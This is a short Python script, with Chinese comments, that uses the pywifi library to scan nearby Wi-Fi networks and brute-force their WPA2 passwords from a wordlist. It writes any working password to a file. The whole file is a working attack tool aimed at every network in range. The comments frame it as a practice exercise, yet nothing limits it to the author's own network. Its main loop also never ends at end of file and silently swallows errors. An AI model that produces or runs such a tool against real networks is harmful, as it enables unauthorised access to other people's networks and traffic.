# -*- coding:utf-8 -*-

import pywifi
from pywifi import const
import time
import os

# 相对路径
root_dir = os.path.abspath('.')
pwd_path = root_dir + "\\wifi\\pwd.txt"

# 瞎写的撞密码，效率很低，当练习，密码来源于自己生成的

def wifiConnect(wifiname, wifipwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.key = wifipwd
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(1.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def wifiSpy():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    result = iface.scan_results()

    fo = open("ssid.txt", "w")
    for i in range(len(result)):
        # print(result[i].ssid, result[i].bssid)
        fo.write("".join(result[i].ssid))
        fo.write("".join("\n"))
    fo.close()



def main():
    print("begin...")
    # wifiSpy()

    ssidfile = open("ssid.txt", "r")
    wifiname = ssidfile.readlines()

    list = []
    for line in wifiname:
        list.append(line.strip())
    # print("wifiname list:", list)
    ssidfile.close()

    pwdfile = open(pwd_path, "r")
    while True:
        wifipwd = pwdfile.readline()
        try:
            for item in list:
                bool = wifiConnect(item, wifipwd.strip())
                if bool:
                    print("密码正确：", item, wifipwd)
                    fo = open("%s.txt"%item, "w")
                    fo.write(item)
                    fo.write(wifipwd)
                    fo.close()
                    break
                else:
                    print("密码错误：", item, wifipwd)
        except:
            continue
    pwdfile.close()
    print("end...")


if __name__ == '__main__':
    main()